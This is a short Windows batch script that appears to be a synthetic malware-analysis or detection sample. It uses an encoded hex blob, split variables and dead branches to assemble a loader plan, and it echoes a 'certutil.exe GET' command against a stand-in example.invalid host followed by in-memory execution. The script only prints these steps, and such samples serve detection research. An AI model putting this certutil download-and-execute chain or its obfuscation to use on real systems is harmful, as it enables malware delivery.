@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|rotate_left
rem HUNTRESS-MATERIAL:ec7a62f8e6e8cae0e67ac2c6e2ead2e4cabee4cadadee8ca58c8d2e6e0c2e8c6d0bedacadadee4f2f8c2c8c2e0e8cae47ac6cae4e8eae8d2d85ccaf0caf8e6e8c2cecabec6deeadce87a62f8cee4c2e0d07accc2d8d8c4c2c6d6bee4cae8e4f2f8dccaf0e8bed8c2dcceeac2ceca7adcdedccaf8c6c2dae0c2d2cedcbed2c87ac6c2dae0c2d2cedc5a686e70c468c866c46472f8eae4d87ad0e8e8e0e6745e5e686e70c468c866c464725ccaf0c2dae0d8ca5cd2dcecc2d8d2c85e6a686ec86ec66cca5cc8c2e8
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set v_a0=v=1^|steps=acquire_remote,dispatch_memory^|adapter=c
set v_a1=ertutil.exe^|stage_count=1^|graph=fallback_retry^|nex
set v_a2=t_language=none^|campaign_id=campaign-478b4d3b29^|ur
set v_a3=l=https://478b4d3b29.example.invalid/547d7c6e.dat
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_opaque_branch=321c8624"
call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "cfg=!v_a0!!v_a1!!v_a2!!v_a3!"
exit /b 0
:HUNTRESS_EMIT
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo certutil.exe GET https://478b4d3b29.example.invalid/547d7c6e.dat then dispatch memory
exit /b 0
